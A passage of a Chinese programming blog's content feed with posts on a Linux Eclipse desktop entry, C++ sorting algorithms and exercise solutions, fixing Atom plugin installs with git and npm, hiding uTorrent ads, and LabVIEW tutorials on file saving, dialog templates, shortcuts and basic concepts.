/usr/share/applications/appName.desktop</code></pre><p>以eclipse为例在新添加的文件<code>eclipse.desktop</code>中添加以下内容：</p><pre><code class="yml">[Desktop Entry]  Type=application  Name=eclipse  Commit=Eclipse Integrated Development Environment  Exec=/opt/eclipse/eclipse  Icon=/opt/eclipse/icon.xpm  Terminal=false  StartupNotify=true  Categories=Development;IDE;Java;</code></pre><p>其中Exec指定应用路径，Icon指定应用图标，Categories用于分类。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> atom </tag>
            
            <tag> ubuntu </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用的排序算法</title>
      <link href="2016/09/20/algor-sort/"/>
      <url>2016/09/20/algor-sort/</url>
      
        <content type="html"><![CDATA[<h2 id="算法复杂度及稳定性"><a href="#算法复杂度及稳定性" class="headerlink" title="算法复杂度及稳定性"></a>算法复杂度及稳定性</h2><table><thead><tr><th align="center">排序方法</th><th align="center">最好时间</th><th align="center">平均时间</th><th align="center">最坏时间</th><th align="center">辅助空间</th><th align="center">稳定性</th></tr></thead><tbody><tr><td align="center">直接插入</td><td align="center">O(n)</td><td align="center">O(n^2)</td><td align="center">O(n^2)</td><td align="center">O(1)</td><td align="center">稳定</td></tr><tr><td align="center">二分插入</td><td align="center">O(n)</td><td align="center">O(n^2)</td><td align="center">O(n^2)</td><td align="center">O(1)</td><td align="center">稳定</td></tr><tr><td align="center">希尔</td><td align="center"></td><td align="center">O(n^1.25)</td><td align="center"></td><td align="center">O(1)</td><td align="center">不稳定</td></tr><tr><td align="center">冒泡</td><td align="center">O(n)</td><td align="center">O(n^2)</td><td align="center">O(n^2)</td><td align="center">O(1)</td><td align="center">稳定</td></tr><tr><td align="center">快速</td><td align="center">O(nlgn)</td><td align="center">O(nlgn)</td><td align="center">O(n^2)</td><td align="center">O(lgn)</td><td align="center">不稳定</td></tr><tr><td align="center">直接选择</td><td align="center">O(n^2)</td><td align="center">O(n^2)</td><td align="center">O(n^2)</td><td align="center">O(1)</td><td align="center">不稳定</td></tr><tr><td align="center">堆</td><td align="center">O(nlgn)</td><td align="center">O(nlgn)</td><td align="center">O(nlgn)</td><td align="center"></td><td align="center">不稳定</td></tr><tr><td align="center">归并</td><td align="center">O(nlgn)</td><td align="center">O(nlgn)</td><td align="center">O(nlgn)</td><td align="center">O(n)</td><td align="center">稳定</td></tr><tr><td align="center">基数</td><td align="center">O(d(rd+n))</td><td align="center">O(d(rd+n))</td><td align="center">O(d(rd+n))</td><td align="center">O(rd+n)</td><td align="center">稳定</td></tr></tbody></table><h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><h3 id="直接插入"><a href="#直接插入" class="headerlink" title="直接插入"></a>直接插入</h3><h4 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h4><ol><li>将序列的第一个元素作为<strong>有序序列</strong>，第二个元素直至最后一个元素作为<strong>待排序序列</strong>;</li><li>从前往后依次扫描<strong>待排序序列</strong>，将扫描的元素依次插入到<strong>有序序列</strong>的适当位置。</li></ol><h4 id="原理示意"><a href="#原理示意" class="headerlink" title="原理示意"></a>原理示意</h4><p><img src="/assets/algorithm/insertSort.gif" alt="insertSort"></p><h4 id="程序实现"><a href="#程序实现" class="headerlink" title="程序实现"></a>程序实现</h4><pre><code class="C++">void insertsort(int array[], int length)&#123;  if (array == NULL || length &lt;= 0)    return;  int index, temp;  for (int i = 1; i&lt;length; i++)  &#123;    // 保存 array[i] 至中间变量    temp = array[i];    index = i;    // 寻找插入位置, index = 1,2,...,i    while (index&gt;0 &amp;&amp; temp&lt;array[index - 1])    &#123;      array[index] = array[index - 1];      index--;    &#125;    // 插入数据    array[index] = temp;  &#125;&#125;// 使用实例int main()&#123;  int array[] = &#123; 23,34,22,67,87,56,15,62,74,46 &#125;;  int length = sizeof(array) / sizeof(int);  insertsort(array, length);  return 0;&#125;</code></pre><h3 id="二分查找插入"><a href="#二分查找插入" class="headerlink" title="二分查找插入"></a>二分查找插入</h3><h4 id="二分思想"><a href="#二分思想" class="headerlink" title="二分思想"></a>二分思想</h4><p>二分查找插入是在直接插入的基础上进行优化，由于在插入前需要查找插入位置，而插入位置处于<strong>有序</strong>序列中，所以可以使用<strong>二分查找</strong>替代原先的逐个扫描，提高查找效率。</p><h4 id="二分实现"><a href="#二分实现" class="headerlink" title="二分实现"></a>二分实现</h4><pre><code class="C++">void binaryInsertsort(int array[], int length)&#123;  if (array == NULL || length &lt;= 0)    return;  int index, temp, left, right, middle;  for (int i = 1; i &lt; length; i++)  &#123;    temp = array[i];      // 将本次待插入数据存入temp    left = 0;    right = i - 1;    if (array[i] &gt;= array[0])    &#123;      // 二分查找      while (left&lt;=right)      &#123;        middle = (left + right) / 2;        if (temp &lt; array[middle])          right = middle - 1;        else          left = middle + 1;      &#125;    &#125;    // 移动数据，left即为查找到的插入位置    for (int j = i - 1; j &gt;= left; j--)      array[j + 1] = array[j];    array[left] = temp;      // 插入temp到指定位置  &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂物柜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模拟试题1 - 计算PA+PB</title>
      <link href="2016/09/12/WYMN1/"/>
      <url>2016/09/12/WYMN1/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>正整数A的<strong>DA(1位整数)部分</strong>定义为由A中所有组成的新整数PA。例如：给定A=3862767，DA=6，则A的<strong>6部分</strong>PA是66，因为A中有2个6。</p><p>现给定A, DA, B, DB, 请编写程序计算PA+PB。</p><h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><blockquote><p>输入在一行中依次给出A，DA，B,DB，中间以空格分隔，其中 0 &lt; A, B &lt; 1e10</p></blockquote><h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><blockquote><p>在一行中输出PA+PB的值</p></blockquote><h3 id="输入例子"><a href="#输入例子" class="headerlink" title="输入例子"></a>输入例子</h3><blockquote><p>3862767 6 13530293 3</p></blockquote><h3 id="输出例子"><a href="#输出例子" class="headerlink" title="输出例子"></a>输出例子</h3><blockquote><p>399</p></blockquote><h2 id="解题程序"><a href="#解题程序" class="headerlink" title="解题程序"></a>解题程序</h2><pre><code class="C++">#include &lt;iostream&gt;using namespace std;void getPA(unsigned long num, int DA, unsigned long &amp; PA)&#123;    PA = 0;    while(num)           // 循环查找num中DA的个数    &#123;      if(num%10==DA)        PA = PA*10+DA;      num/=10;    &#125;&#125;int main()&#123;    unsigned long A,B;    unsigned long PA=0,PB=0;    int DA,DB;    cin&gt;&gt;A&gt;&gt;DA&gt;&gt;B&gt;&gt;DB;    getPA(A,DA,PA);      // 计算PA    getPA(B,DB,PB);      // 计算PB    cout&lt;&lt;PA+PB&lt;&lt;endl;    return 0;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂物柜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模拟试题2 - 二货小易的网格盒子</title>
      <link href="2016/09/12/WYMN2/"/>
      <url>2016/09/12/WYMN2/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>二货小易有一个W*H的网格盒子，网格的行编号为0<del>H-1，网格的列编号为0</del>W-1。每个格子至多可以放一块蛋糕，任意两块蛋糕的欧几里得距离不能等于2。</p><p>对于两个格子坐标(x1,y1), (x2,y2)的欧几里得距离为：((x1-x2)<em>(x1-x2)+(y1-y2)</em>(y1-y2))的算术平方根。</p><p>小易想知道最多可以放多少块蛋糕在网格盒子里。</p><h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><blockquote><p>每组数组包含网格长宽W,H，用空格分隔。(1&lt;=W、H&lt;=1000)</p></blockquote><h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><blockquote><p>输出一个最多可以放的蛋糕数</p></blockquote><h3 id="输入例子"><a href="#输入例子" class="headerlink" title="输入例子"></a>输入例子</h3><blockquote><p>3 2</p></blockquote><h3 id="输出例子"><a href="#输出例子" class="headerlink" title="输出例子"></a>输出例子</h3><blockquote><p>4</p></blockquote><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>根据题意，可以推测出蛋糕数最多的放置方案：将网格进行分区，每四个构成一个正方形的网格作为一个分区，类似于坐标变换。假设原坐标为(x,y),那么变换后的分区坐标为(x/2,y/2)。当变换后的分区坐标满足横纵坐标之和为偶数时，该分区内的4个网格均可放置蛋糕。</p><p><img src="/assets/algorithm/putCake.png" alt="putCake"></p><h2 id="解题程序"><a href="#解题程序" class="headerlink" title="解题程序"></a>解题程序</h2><pre><code class="C++">#include &lt;iostream&gt;using namespace std;int main()&#123;  int W,H;  int cnt=0; // 定义可放的蛋糕数  cin&gt;&gt;W&gt;&gt;H; // 输入盒子网格的行列数  for(int i = 0; i&lt;H; i++)      for(int j = 0; j &lt; W; j++)        if((i/2 + j/2) % 2 == 0)          cnt++;  cout&lt;&lt;cnt&lt;&lt;endl;  return 0;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂物柜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决atom无法安装插件的问题</title>
      <link href="2016/08/21/atom-packages/"/>
      <url>2016/08/21/atom-packages/</url>
      
        <content type="html"><![CDATA[<h2 id="出错信息"><a href="#出错信息" class="headerlink" title="出错信息"></a>出错信息</h2><p>倘若使用<a href="https://atom.io/">atom</a>自带的插件安装工具&quot;File-&gt;Settings-&gt;Install&quot;安装插件，通常会报错，以&quot;pp-markdown&quot;为例，其错误信息如下：</p><pre><code class="bash">  gyp info it worked if it ends with ok  gyp info using node-gyp@2.0.2  gyp info using node@0.10.40 | win32 | ia32  gyp http GET http://gh-contractor-zcbenz.s3.amazonaws.com/atom-shell/dist/v0.37.8/node-v0.37.8.tar.gz  gyp WARN install got an error, rolling back install  gyp  ! Compiler tools not found  Packages that depend on modules that contain C/C++ code will fail to install.  Read &lt;a href=&quot;http://flight-manual.atom.io/&quot;&gt;here&lt;/a&gt; for instructions on installing Python and Visual Studio.  Run apm install --check after installing to test compiling a native module.</code></pre><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><p>安装<a href="https://nodejs.org/en/">node.js</a>的目的在于使用npm工具，放弃apm工具。如果已经安装好，那么这一步自然可以略过。</p><h3 id="下载插件"><a href="#下载插件" class="headerlink" title="下载插件"></a>下载插件</h3><p>在atom的插件安装界面搜索所需的插件，点击插件名称将会从网页打开atom的插件库。</p><p><img src="/assets/atom/package.png" alt="atompackage"></p><p>此时我们点击<code>Repo</code>可以转至其github页面，复制插件的远程仓库目录。</p><p><img src="/assets/atom/package_git.png" alt="gitpackage"></p><p>在本地打开文件夹&quot;C:\Users\USER_NAME\.atom\packages&quot;，使用git指令将插件<code>clone</code>到该目录。</p><pre><code class="bash">git clone 插件的远程仓库目录</code></pre><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>转至插件目录，使用<code>npm install</code>完成插件安装，重启atom即可。</p><pre><code class="bash">$ cd pp-markdown$ npm installmarked@0.3.6 node_modules\markedatom-space-pen-views@2.2.0 node_modules\atom-space-pen-views├── fuzzaldrin@2.1.0└── space-pen@5.1.2 (underscore-plus@1.6.6, jquery@2.1.4, grim@1.5.0)</code></pre><h3 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h3><p><img src="/assets/atom/pp-markdown.png" alt="pp-markdown"></p><p>该方案看似有点繁琐，却也能够达到目的，毕竟我们需要安装的插件并不会太多，它日有更好的方法再用不迟。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> atom </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>消除utorrent中的广告</title>
      <link href="2016/08/17/clearAD/"/>
      <url>2016/08/17/clearAD/</url>
      
        <content type="html"><![CDATA[<p>其实，网上已有大把的教程教我如何去广告，但每次都要谷歌百度却也烦不胜烦，这也就只好搬运到这咯，一劳永逸。</p><h2 id="去广告前"><a href="#去广告前" class="headerlink" title="去广告前"></a>去广告前</h2><p><img src="/assets/utorrent/haveAD.png" alt="haveAD"></p><h2 id="去广告"><a href="#去广告" class="headerlink" title="去广告"></a>去广告</h2><ol><li>在utorrent的菜单栏中选择&quot;选项&quot;，打开“设置”界面，或者按快捷键<code>ctrl+p</code>;</li><li>在设置界面中选择最后一项&quot;高级&quot;;</li><li>在过滤中输入&quot;offers.&quot;，将以下两项设为false：<ul><li>&quot;offers.sponsored_torrent_offer_enabled&quot; ,</li><li>&quot;offers.left_rail_offer_enabled&quot;</li></ul></li><li>在过滤中输入&quot;gui.&quot;,将&quot;gui.show_notorrents_node&quot;设为false.</li></ol><p><img src="/assets/utorrent/settingPanel.png" alt="haveAD"></p><h2 id="去广告后"><a href="#去广告后" class="headerlink" title="去广告后"></a>去广告后</h2><p><img src="/assets/utorrent/noAD.png" alt="haveAD"></p><p>好了，至此广告一扫全无，enjoy it！</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> utorrent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Labview - 存储txt文件</title>
      <link href="2016/06/10/labview-rwTxt/"/>
      <url>2016/06/10/labview-rwTxt/</url>
      
        <content type="html"><![CDATA[<h2 id="存储文件"><a href="#存储文件" class="headerlink" title="存储文件"></a>存储文件</h2><h3 id="简单存储"><a href="#简单存储" class="headerlink" title="简单存储"></a>简单存储</h3><p>写个简单的小程序，用于存储四列随机数，每隔1s存储一次，数据之间以tab作为分隔符。</p><p><img src="/assets/labview/rwTxt/readTxt.png" alt="readTxt"></p><p>存储后的文件:</p><p><img src="/assets/labview/rwTxt/testTxt.png" alt="testTxt"></p><h3 id="加入表头"><a href="#加入表头" class="headerlink" title="加入表头"></a>加入表头</h3><p>看着上面这个文件，总感觉少点什么，对了，表头还没加。那就加个判断，首次创建文件时添个表头。为了简化点，定时结构就不截图了。</p><p><img src="/assets/labview/rwTxt/addTitle.png" alt="addTitle"></p><p>现在再来看看这个txt文件，表头已经被加上了，虽然看着没怎么对齐，但这是正常的，如果导入至Excel就可以看出来。</p><p><img src="/assets/labview/rwTxt/testTitle.png" alt="testTitle"></p><h3 id="存储时间"><a href="#存储时间" class="headerlink" title="存储时间"></a>存储时间</h3><p>大部分情况下，我们在存储数据的同时需要记录存储时间，那么就再稍稍修改一下程序。</p><p><img src="/assets/labview/rwTxt/addTime.png" alt="addTime"></p><p>添加的东西也不多，就是多了个表头，每组数据前多了个时间标识，需要说明一点的是，这里用到的&quot;格式化日期/时间字符串&quot;，它的格式化方法可以参考以下说明。</p><p><img src="/assets/labview/rwTxt/timeStrHelp.png" alt="timeStrHelp"></p><blockquote><p>下列代码为部分常用的时间格式代码：%c可显示依据地域语言设定的日期/时间。<br><strong>时间</strong>相关格式代码为：%X（指定地域的时间），%H（小时，24小时），%I（小时，12小时），%M（分钟），%S（秒），%u（分数秒），%p（a.m./p.m.标识）。<br><strong>日期</strong>相关格式代码为：%x（指定地域日期），%y（两位年份），%Y（四位年份），%m（月份），%b（月名缩写），%d（一个月中的天值），%a（星期名缩写）。</p></blockquote><p>好了，改好了就测试一下，看看时间已经被加上了。</p><p><img src="/assets/labview/rwTxt/testTime.png" alt="testTime"></p><h3 id="有趣实例"><a href="#有趣实例" class="headerlink" title="有趣实例"></a>有趣实例</h3><p>好了，现在来写个有趣的小程序，定时存储一组数据至txt文件，包含人的姓名、性别、年龄、身高和名族。具体要求如下表所示。</p><table><thead><tr><th></th><th>姓名</th><th>性别</th><th>年龄</th><th>身高(m)</th><th>汉族</th></tr></thead><tbody><tr><td>数据类型</td><td>字符串</td><td>字符串</td><td>Byte</td><td>Double</td><td>布尔</td></tr><tr><td>要求</td><td>随机</td><td>男/女</td><td>12~40</td><td>1.40~1.80</td><td>T/F</td></tr></tbody></table><p>程序框图如下：</p><p><img src="/assets/labview/rwTxt/randomWrite.png" alt="randomWrite"></p><p>好了，现在运行程序，看看会有哪些有趣的名字呢。</p><p><img src="/assets/labview/rwTxt/randomTxt.png" alt="randomTxt"></p><p>关于.txt文件存储就讲这些吧。以后若是有其它运用方式，遇到了再写不迟。</p><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p>文中提到的两个vi文件已共享至百度网盘，以供<a href="http://pan.baidu.com/s/1kU7mveZ">下载</a>。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> LabVIEW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> labview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Labview - 对话框程序模板</title>
      <link href="2016/06/06/labview-dialog/"/>
      <url>2016/06/06/labview-dialog/</url>
      
        <content type="html"><![CDATA[<p>软件开发过程中，经常要使用对话框界面，例如各种参数设置界面等。为了减少重复性工作，我们可以创建一个对话框模板，往后就可以通过该模板直接新建对话框界面。</p><h2 id="创建模板"><a href="#创建模板" class="headerlink" title="创建模板"></a>创建模板</h2><h3 id="新建vi"><a href="#新建vi" class="headerlink" title="新建vi"></a>新建vi</h3><p>打开LabVIEW软件，新建vi，保存为&quot;对话框模板.vi&quot;。</p><p><img src="/assets/labview/dialog/template.png" alt="Labview template.vi"></p><h3 id="添加while循环"><a href="#添加while循环" class="headerlink" title="添加while循环"></a>添加while循环</h3><p>对话框界面也属于用户界面，所以需要给它单独开辟一个线程，即一个while循环。</p><p><img src="/assets/labview/dialog/while.png" alt="Labview while"></p><h3 id="添加移位寄存器"><a href="#添加移位寄存器" class="headerlink" title="添加移位寄存器"></a>添加移位寄存器</h3><p>在while循环左上角添加一个移位寄存器，然后创建一个<strong>枚举常量</strong>，给其添加以下内容：</p><ul><li>init：初始化</li><li>run：运行</li><li>exit：退出</li></ul><p>编辑完成后点击确定，然后将其连接至移位寄存器的输入端，默认设为&quot;init&quot;。</p><p><img src="/assets/labview/dialog/enum.png" alt="Labview enum"></p><h3 id="添加条件结构"><a href="#添加条件结构" class="headerlink" title="添加条件结构"></a>添加条件结构</h3><p>在while循环中添加一个条件结构，将将移位寄存器的值作为判断条件。为条件结构的每个值添加分支。</p><p><img src="/assets/labview/dialog/switch.png" alt="Labview switch"></p><h3 id="添加事件结构"><a href="#添加事件结构" class="headerlink" title="添加事件结构"></a>添加事件结构</h3><p>在条件结构的&quot;run&quot;分支中添加事件结构，用于响应用户操作。至此，所需的三个主要控制结构就都有了。</p><p><img src="/assets/labview/dialog/event.png" alt="Labview event"></p><h3 id="修改init分支"><a href="#修改init分支" class="headerlink" title="修改init分支"></a>修改init分支</h3><p>在条件结构的&quot;init&quot;（初始化）分支中，用户可以添加对话框的<strong>初始化</strong>程序。该分支只执行一次，接着进入&quot;run&quot;（主程序运行）分支，所以需要将移位寄存器的值设为&quot;run&quot;。</p><p><img src="/assets/labview/dialog/init.png" alt="Labview init"></p><h3 id="添加前面板关闭事件"><a href="#添加前面板关闭事件" class="headerlink" title="添加前面板关闭事件"></a>添加前面板关闭事件</h3><p>给事件结构添加&quot;前面板关闭？&quot;事件分支，然后将&quot;放弃？&quot;设为真，不让前面板在此刻关闭。同时将移位寄存器的值设为&quot;exit&quot;。</p><p><img src="/assets/labview/dialog/closeFront.png" alt="Labview closeFront"></p><p><img src="/assets/labview/dialog/exit.png" alt="Labview exit"></p><h3 id="添加循环停止条件"><a href="#添加循环停止条件" class="headerlink" title="添加循环停止条件"></a>添加循环停止条件</h3><p>所有的while循环都需要一个停止条件，这里的while循环同样也需要，其停止条件便是移位寄存器的值变为&quot;exit&quot;。</p><p><img src="/assets/labview/dialog/exitRule.png" alt="Labview exitRule"></p><h3 id="完善移位寄存器"><a href="#完善移位寄存器" class="headerlink" title="完善移位寄存器"></a>完善移位寄存器</h3><p>现在看看程序，是不是还无法执行，因为移位寄存器的部分连线没有赋值，现在简要演示一下完善过程。</p><p><img src="/assets/labview/dialog/register.gif" alt="Labview register"></p><h3 id="添加界面关闭程序"><a href="#添加界面关闭程序" class="headerlink" title="添加界面关闭程序"></a>添加界面关闭程序</h3><p>从上面可以看出，在关闭前面板时，我们选择了放弃，然后进入&quot;exit&quot;分支，就是为了在这个分支中处理界面关闭前的任务，例如存储数据，保存界面参数等操作。不过这样一来，我们就需要在while循环结束时关闭界面，此处可以使用属性节点。</p><p><img src="/assets/labview/dialog/exitPanel.png" alt="Labview exitPanel"></p><h2 id="设置vi属性"><a href="#设置vi属性" class="headerlink" title="设置vi属性"></a>设置vi属性</h2><p>以上操作完成了对话框界面的程序框图设计，但此时运行该对话框，它还包含了系统自带的菜单栏和工具栏，而这些都是对话框不需要的。</p><p><img src="/assets/labview/dialog/dialog_1.png" alt="Labview dialog"></p><p>此时，我们可以通过快捷键<code>Ctrl+I</code>打开<strong>VI属性</strong>界面，在类别中选择<strong>窗口外观</strong>，最后选择<strong>对话框</strong>，点击确定。</p><p><img src="/assets/labview/dialog/dialog_view.png" alt="Labview VI Properties"></p><p>到此为止，一个简单的对话框界面模板就完成了，往后使用时，就可以通过&quot;复制该模板&rarr;重命名vi文件&rarr;添砖加瓦&quot;得到新的对话框。</p><p><img src="/assets/labview/dialog/dialog_2.png" alt="Labview dialog"></p><p>该模板比较简单，但是非常实用，大多数设置界面都可以使用该模板进行设计。当然也可以进一步完善。例如，很多设置界面都有<strong>应用</strong>按钮和<strong>退出</strong>按钮，那么，我们可以在模板中添加一个应用按钮和一个退出按钮，并添加对应的按钮点击事件，修改移位寄存器的值。</p><h2 id="下载模板"><a href="#下载模板" class="headerlink" title="下载模板"></a>下载模板</h2><p>我将模板存至网盘便于下载：<a href="http://pan.baidu.com/s/1pKUe7Ib">下载链接</a>。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> LabVIEW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> labview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Labview - 常用快捷键</title>
      <link href="2016/06/06/shrotcuts/"/>
      <url>2016/06/06/shrotcuts/</url>
      
        <content type="html"><![CDATA[<p>作为一款功能强大的编程软件，自然少不了大量的快捷键支持。在开发过程中，熟练使用这些快捷键，可以高效完成编码调试过程，减少手动操作，提高工作效率。</p><h2 id="菜单快捷键"><a href="#菜单快捷键" class="headerlink" title="菜单快捷键"></a>菜单快捷键</h2><p>打开LabVIEW中的&quot;选项&quot;界面，在&quot;菜单快捷键&quot;中可以看到所有可用的快捷键。当然，如果觉得不够用或是与其它软件有冲突，可以手动添加或修改新的快捷键。</p><p><img src="/assets/labview/shortcuts/editPanel.png" alt="Labview editPanel"></p><h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><p>快捷键虽多，但常用的却有限。我简单将其分为通用键、功能键和技巧键。</p><h3 id="通用键"><a href="#通用键" class="headerlink" title="通用键"></a>通用键</h3><p>有些快捷键是大部分软件共有的，其功能也类似。</p><ul><li>Ctrl+N：新建</li><li>Ctrl+A：全选</li><li>Ctrl+C：复制</li><li>Ctrl+V：粘贴</li><li>Ctrl+S：保存</li><li>Ctrl+Shift+S：保存全部</li></ul><h3 id="功能键"><a href="#功能键" class="headerlink" title="功能键"></a>功能键</h3><p>在代码编辑过程中经常会用到的功能性快捷键包括：</p><ul><li>Ctrl+R：运行程序</li><li>Ctrl+E：在前面板和程序框图之间切换</li><li>Ctrl+H：打开/关闭即时帮助</li><li>Ctrl+B：删除断线</li><li>Ctrl+I：查看当前VI属性</li><li>Ctrl+T：左右两栏显示前面板和程序框图</li><li>Ctrl+W：关闭当前界面或项目</li><li>Ctrl+Q：退出LabVIEW</li></ul><h3 id="技巧键"><a href="#技巧键" class="headerlink" title="技巧键"></a>技巧键</h3><ul><li>Ctrl+鼠标拖动：复制被选控件或函数</li><li>Ctrl+鼠标滚轮：切换多层结构的当前结构帧</li><li>Shift+控件：将鼠标改为选择指针，用于选中某个或多个控件</li><li>双击鼠标左键：添加注释</li><li>Ctrl+Shift+鼠标拖动：将鼠标改为手形指针，用于拖动程序框图</li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>如果一个函数仅包含两个输入接口时，例如：加、减、乘、除。当我们要切换两个输入接口的连线时，例如减法的两个输入A和B，开始连接的时候是A-B，现在发现不对，要改成B-A。默认我们会去删除两条线然后重新连接，但使用快捷键<code>Ctrl+Click</code>可以直接完成切换。<br><img src="/assets/labview/shortcuts/exchange.gif" alt="Labview exchange"></p><p><strong>使用方法：</strong>在点击Ctrl后移动鼠标至函数的任一输入端，鼠标指针会变为类似数字8的一个图标，此时点击鼠标左键即可完成切换。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> LabVIEW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> labview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Labview - 基本概念</title>
      <link href="2016/06/05/labview-base/"/>
      <url>2016/06/05/labview-base/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>《百度百科》词条&quot;LabVIEW&quot;中提到：</p><blockquote><p><strong>LabVIEW</strong>（Laboratory Virtual Instrument Engineering Workbench）由美国国家仪器（NI）公司研制开发，是一种用图标代替文本行创建应用程序的图形化编程语言，它广泛地被工业界、学术界和研究实验室所接受，视为一个标准的数据采集和仪器控制软件。与<strong>C</strong>和<strong>BASIC</strong>一样，LabVIEW也是通用的编程系统，有一个完成任何编程任务的庞大函数库。采用数据流编程方式，程序框图中节点之间的数据流向决定了VI及函数的执行顺序。</p></blockquote><p><img src="/assets/labview/keyWords/Labview.png" alt="Labview"></p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>在使用LabVIEW进行软件开发的过程中，少不了提及一些专有名词和概念，这里对常用的几个概念进行简要说明。</p><h3 id="VI"><a href="#VI" class="headerlink" title="VI"></a>VI</h3><p><strong>VI</strong> 是（Virtual Instrument）的简称，其对应的 <strong>.vi</strong> 文件是LabVIEW软件开发过程中用到的基本单元，类似于 <strong>C/C</strong> 语言开发的 <strong>.c/.cpp</strong> 文件。无论是用于显示的用户界面，还是不用于显示的函数，都是以 <strong>.vi</strong> 文件形式存在。</p><h3 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h3><p>相对于独立的vi文件，LabVIEW<strong>项目</strong>则是一个大的容器，它可以包含一个或多个 <strong>.vi</strong> 文件，以及其它类型的依赖文件，如 <strong>.dll</strong> 链接库文件**.rhm** 菜单文件**.lvproj** 工程文件**.lib** 函数库文件**.ctl** 自定义控件文件等。当然，一个项目还可以包含**.txt** 等数据文件。独立的 <strong>vi</strong> 可以单独执行，但如果需要打包成 <strong>.exe</strong> 可执行文件或 <strong>.setup</strong> 安装包文件，就必须创建<strong>项目</strong>文件，通过 &quot;程序设计规范&quot; 对项目文件进行打包处理。</p><p><img src="/assets/labview/keyWords/project.png" alt="Labview project"></p><h3 id="前面板"><a href="#前面板" class="headerlink" title="前面板"></a>前面板</h3><p>在LabVIEW开发环境中，vi程序分<strong>前面板</strong>和<strong>程序框图</strong>两部分。其中<strong>前面板</strong>用于设计用户界面，可以放置各种程序控件，是软件用户能够看见的交互界面。如果作为函数vi，其<strong>前面板</strong>还可以设置函数接口。软件完成并生成可执行文件后，软件用户界面显示的就是该界面所对应vi程序的<strong>前面板</strong>，而其它仅实现某种函数功能而无需显示的vi程序，其<strong>前面板</strong>将不会在调用过程中显示。</p><p><img src="/assets/labview/keyWords/frontPanel.png" alt="Labview frontPanel"></p><h3 id="程序框图"><a href="#程序框图" class="headerlink" title="程序框图"></a>程序框图</h3><p><strong>程序框图</strong>作为vi程序的另一部分，用于实现软件功能。从前面板获取用户数据，在<strong>程序框图</strong>中进行逻辑运算，并将运算结果返回前面板或存储至本地文件。在框图中，开发人员可以通过各种控制结构（顺序、循环、条件、事件、定时等）控制程序的执行顺序，通过调用LabVIEW内置函数库中的大量函数实现软件功能。</p><p><img src="/assets/labview/keyWords/flowChart.png" alt="Labview flowChart"></p><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>与其它编程语言一样，LabVIEW也有<strong>局部变量</strong>和<strong>全局变量</strong>局部变量**作用域为本vi程序，只能在本vi中调用。本vi启动时，系统为其分配内存空间；当本vi结束运行后，系统释放其内存。</p><h3 id="全局变量"><a href="#全局变量" class="headerlink" 